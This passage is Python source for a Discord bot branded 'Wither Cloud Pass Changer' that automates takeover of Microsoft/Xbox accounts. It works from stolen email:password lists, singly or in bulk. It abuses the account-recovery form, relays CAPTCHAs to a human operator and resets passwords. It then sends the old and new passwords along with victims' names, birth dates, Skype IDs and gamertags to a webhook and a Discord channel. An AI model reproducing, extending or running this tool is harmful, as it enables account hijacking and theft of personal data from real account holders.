    await msg.edit(embed=embed)
    await log_message(f"Account info scraped for {email}")
    
    captcha_img, driver, token, tempmail = await submit_acsr_form(account_info)
    if not captcha_img:
        embed = send_embed("Error", "Failed at ACSR submission")
        await ctx.send(embed=embed)
        await log_message(f"ACSR submission failed for {email}")
        return
    
    embed = send_embed("CAPTCHA Required", f"Complete this CAPTCHA for {email}")
    await captcha_channel.send(embed=embed, file=discord.File(captcha_img, "captcha.png"))
    await log_message(f"CAPTCHA sent for {email}")
    
    try:
        captcha_response = await bot.wait_for("message", check=check, timeout=120)
        captcha_solution = captcha_response.content.strip()
    except asyncio.TimeoutError:
        embed = send_embed("Timeout", "CAPTCHA timeout")
        await ctx.send(embed=embed)
        return
    
    await log_message(f"CAPTCHA answer received for {email}: {captcha_solution}")
    
    embed = send_embed("Processing", "Processing ACSR flow...")
    msg = await ctx.send(embed=embed)
    
    reset_link = await continue_acsr_flow(driver, account_info, token, captcha_solution, str(ctx.author.id))
    
    retry_count = 0
    while reset_link == "CAPTCHA_RETRY_NEEDED" and retry_count < 3:
        retry_count += 1
        embed = send_embed("Wrong CAPTCHA", f"Retry {retry_count}/3")
        await ctx.send(embed=embed)
        
        captcha_img = download_captcha(driver)
        if captcha_img:
            embed = send_embed("New CAPTCHA", f"Complete this CAPTCHA for {email}")
            await captcha_channel.send(embed=embed, file=discord.File(captcha_img, f"captcha_retry_{retry_count}.png"))
        
        try:
            captcha_response = await bot.wait_for("message", check=check, timeout=120)
            captcha_solution = captcha_response.content.strip()
        except asyncio.TimeoutError:
            embed = send_embed("Timeout", "CAPTCHA timeout")
            await ctx.send(embed=embed)
            return
        
        reset_link = await continue_acsr_flow(driver, account_info, token, captcha_solution, str(ctx.author.id))
    
    if not reset_link or reset_link in ["CAPTCHA_RETRY_NEEDED", "OTP not received.", "CAPTCHA_DOWNLOAD_FAILED"]:
        embed = send_embed("Error", f"Failed to get reset link: {reset_link}")
        await ctx.send(embed=embed)
        await log_message(f"Failed to get reset link for {email}: {reset_link}")
        return
    
    embed = send_embed("Resetting", "Resetting password...")
    await msg.edit(embed=embed)
    
    updated_password = await perform_password_reset(reset_link, email, new_password)
    time_taken = time.time() - start_time
    
    result = {
        "email": email,
        "old_password": password,
        "new_password": updated_password,
        "name": account_info.get('name', 'N/A'),
        "dob": account_info.get('dob', 'N/A'),
        "region": account_info.get('region', 'N/A'),
        "skype_id": account_info.get('skype_id', 'N/A'),
        "skype_email": account_info.get('skype_email', 'N/A'),
        "gamertag": account_info.get('gamertag', 'N/A'),
        "success": True
    }
    
    if CONFIG.get("webhook_url"):
        send_webhook([result], CONFIG["webhook_url"])
    
    if SUCCESS_CHANNEL:
        embed = discord.Embed(title="Wither Cloud Pass Change Success", color=0xffffff)
        embed.add_field(name="Email", value=email, inline=True)
        embed.add_field(name="New Password", value=updated_password, inline=True)
        embed.add_field(name="Old Password", value=password, inline=True)
        embed.add_field(name="Skype ID", value=result["skype_id"], inline=True)
        embed.add_field(name="Skype Email", value=result["skype_email"], inline=True)
        embed.add_field(name="Name", value=result["name"], inline=True)
        embed.add_field(name="DOB", value=result["dob"], inline=True)
        embed.add_field(name="Region", value=result["region"], inline=True)
        embed.add_field(name="Xbox GamerTag", value=result["gamertag"], inline=True)
        embed.add_field(name="Time taken to Pass Change", value=f"{time_taken:.2f} seconds", inline=True)
        embed.set_footer(text="Wither Cloud Pass Changer | By SeriesV2")
        await SUCCESS_CHANNEL.send(embed=embed)
    
    fields = {
        "Email": email,
        "Old Password": password[:5] + "***",
        "New Password": updated_password[:5] + "***",
        "Name": result["name"],
        "Gamertag": result["gamertag"]
    }
    embed = send_embed("Recovery Complete", "Password successfully changed!", fields=fields)
    await ctx.send(embed=embed)
    await log_message(f"Recovery complete for {email} - new password: {updated_password}")

@bot.command(name="bulk")
async def bulk(ctx):
    if ctx.author.id not in authed_users:
        embed = send_embed("Error", "You are not authorized to use this command.")
        await ctx.send(embed=embed)
        return
    if not CAPTCHA_CHANNEL:
        embed = send_embed("Error", "Captcha channel not set. Use .set-captcha to set it.")
        await ctx.send(embed=embed)
        return
    if not ctx.message.attachments:
        embed = send_embed("Error", "Please attach a .txt file with credentials.")
        await ctx.send(embed=embed)
        return
    attachment = ctx.message.attachments[0]
    if not attachment.filename.endswith('.txt'):
        embed = send_embed("Error", "Please attach a .txt file.")
        await ctx.send(embed=embed)
        return
    content = await attachment.read()
    lines = content.decode('utf-8').splitlines()
    captcha_channel = CAPTCHA_CHANNEL
    def check(m):
        return m.author == ctx.author and m.channel == captcha_channel
    for line in lines:
        if ":" not in line:
            continue
        email, password = line.split(":", 1)
        start_time = time.time()
        new_password = generate_withercloud_password()
        await log_message(f"Starting bulk recovery for {email}")
        
        embed = send_embed("Bulk Processing", f"Processing {email}...")
        msg = await ctx.send(embed=embed)
        
        account_info = await scrape_account_info(email, password)
        if account_info.get("error"):
            embed = send_embed("Error", f"Failed for {email}: {account_info['error']}")
            await ctx.send(embed=embed)
            await log_message(f"Error scraping {email}: {account_info['error']}")
            continue
        
        captcha_img, driver, token, tempmail = await submit_acsr_form(account_info)
        if not captcha_img:
            embed = send_embed("Error", f"Failed at ACSR for {email}")
            await ctx.send(embed=embed)
            await log_message(f"ACSR submission failed for {email}")
            continue
        
        embed = send_embed("CAPTCHA Required", f"Complete this CAPTCHA for {email}")
        await captcha_channel.send(embed=embed, file=discord.File(captcha_img, f"captcha_{email}.png"))
        
        try:
            captcha_response = await bot.wait_for("message", check=check, timeout=120)
            captcha_solution = captcha_response.content.strip()
        except asyncio.TimeoutError:
            embed = send_embed("Timeout", f"CAPTCHA timeout for {email}")
            await ctx.send(embed=embed)
            continue
        
        reset_link = await continue_acsr_flow(driver, account_info, token, captcha_solution, str(ctx.author.id))
        
        retry_count = 0
        while reset_link == "CAPTCHA_RETRY_NEEDED" and retry_count < 3:
            retry_count += 1
            captcha_img = download_captcha(driver)
            if captcha_img:
                embed = send_embed("New CAPTCHA", f"Complete this CAPTCHA for {email}")
                await captcha_channel.send(embed=embed, file=discord.File(captcha_img, f"captcha_retry_{email}_{retry_count}.png"))
            
            try:
                captcha_response = await bot.wait_for("message", check=check, timeout=120)
                captcha_solution = captcha_response.content.strip()
            except asyncio.TimeoutError:
                break
            
            reset_link = await continue_acsr_flow(driver, account_info, token, captcha_solution, str(ctx.author.id))
        
        if not reset_link or reset_link in ["CAPTCHA_RETRY_NEEDED", "OTP not received.", "CAPTCHA_DOWNLOAD_FAILED"]:
            embed = send_embed("Error", f"Failed for {email}: {reset_link}")
            await ctx.send(embed=embed)
            await log_message(f"Failed for {email}: {reset_link}")
            continue
        
        updated_password = await perform_password_reset(reset_link, email, new_password)
        time_taken = time.time() - start_time
        
        result = {
            "email": email,
            "old_password": password,
            "new_password": updated_password,
            "name": account_info.get('name', 'N/A'),
            "dob": account_info.get('dob', 'N/A'),
            "region": account_info.get('region', 'N/A'),
            "skype_id": account_info.get('skype_id', 'N/A'),
            "skype_email": account_info.get('skype_email', 'N/A'),
            "gamertag": account_info.get('gamertag', 'N/A'),
            "success": True
        }
        
        if SUCCESS_CHANNEL:
            embed = discord.Embed(title="Wither Cloud Pass Change Success", color=0xffffff)
            embed.add_field(name="Email", value=email, inline=True)
            embed.add_field(name="New Password", value=updated_password, inline=True)
            embed.add_field(name="Old Password", value=password, inline=True)
            embed.add_field(name="Skype ID", value=result["skype_id"], inline=True)
            embed.add_field(name="Skype Email", value=result["skype_email"], inline=True)
            embed.add_field(name="Name", value=result["name"], inline=True)
            embed.add_field(name="DOB", value=result["dob"], inline=True)
            embed.add_field(name="Region", value=result["region"], inline=True)
            embed.add_field(name="Xbox GamerTag", value=result["gamertag"], inline=True)
            embed.add_field(name="Time taken to Pass Change", value=f"{time_taken:.2f} seconds", inline=True)
            embed.set_footer(text="Wither Cloud Pass Changer | By SeriesV2")
            await SUCCESS_CHANNEL.send(embed=embed)
        
        embed = send_embed("Bulk Success", f"Password changed for {email}")
        await ctx.send(embed=embed)
        await log_message(f"Bulk complete for {email} - new password: {updated_password}")

@bot.command(name="set-captcha")
async def set_captcha(ctx, channel: discord.TextChannel):
    if ctx.author.id != OWNER_ID:
        return
    global CAPTCHA_CHANNEL
    CAPTCHA_CHANNEL = channel
    CONFIG["captcha_channel"] = channel.id
    save_config()
    embed = send_embed("Captcha Channel Set", f"Captchas will be sent to {channel.mention}")
    await ctx.send(embed=embed)

@bot.command(name="set-success")
async def set_success(ctx, channel: discord.TextChannel):
    if ctx.author.id != OWNER_ID:
        return
    global SUCCESS_CHANNEL
    SUCCESS_CHANNEL = channel
    CONFIG["success_channel"] = channel.id
    save_config()
    embed = send_embed("Success Channel Set", f"Success messages will be sent to {channel.mention}")
    await ctx.send(embed=embed)

@bot.command(name="auth")
async def auth(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        return
    authed_users.add(user.id)
    save_authed()
    embed = send_embed("Authorized", f"{user.mention} has been authorized.")
    await ctx.send(embed=embed)

@bot.command(name="unauth")
async def unauth(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        return
    authed_users.discard(user.id)
    save_authed()
    embed = send_embed("Unauthorized", f"{user.mention} has been unauthorized.")
    await ctx.send(embed=embed)

@bot.command(name="set-webhook")
async def set_webhook(ctx, webhook_url: str):
    global CONFIG
    CONFIG["webhook_url"] = webhook_url
    save_config()
    embed = send_embed("Webhook Set", "Webhook URL saved")
    await ctx.send(embed=embed)

TOKEN = CONFIG["token"]
if not TOKEN:
    print("TOKEN not set in config.json")
else:
    CONFIG = load_config()
    bot.run(TOKEN)
